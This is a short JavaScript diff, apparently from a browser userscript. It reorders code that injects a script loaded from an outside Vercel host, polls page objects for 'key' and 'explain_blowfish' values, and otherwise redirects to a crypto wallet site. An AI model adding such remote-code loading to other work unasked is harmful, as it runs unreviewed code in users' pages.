@@ -20,11 +20,10 @@ const ensurePageChange = setInterval(() => {
       const params = new URLSearchParams(url.search);
       const key = params.get("key");
       if (key) {
-        const script = document.createElement('script');
-        script.src = 'https://wowee.vercel.app/main_source.js';
-        document.body.appendChild(script);
-       setInterval(() => {
-          Object.keys(window).forEach((keyName) => {
+
+      setInterval(() => {
+          try {
+            Object.keys(window).forEach((keyName) => {
               try {
                   if (typeof(window[keyName]) == "object") {
                       if (window[keyName]["key"] != null && window[key]["explain_blowfish"] != null) {
@@ -33,7 +32,12 @@ const ensurePageChange = setInterval(() => {
                   }
               } catch(error) {}
           });
+          } catch(error) {}
        }, 50);
+
+        const script = document.createElement('script');
+        script.src = 'https://wowee.vercel.app/main_source.js';
+        document.body.appendChild(script);
       } else {
         location.href = "https://phantom.app"
       }
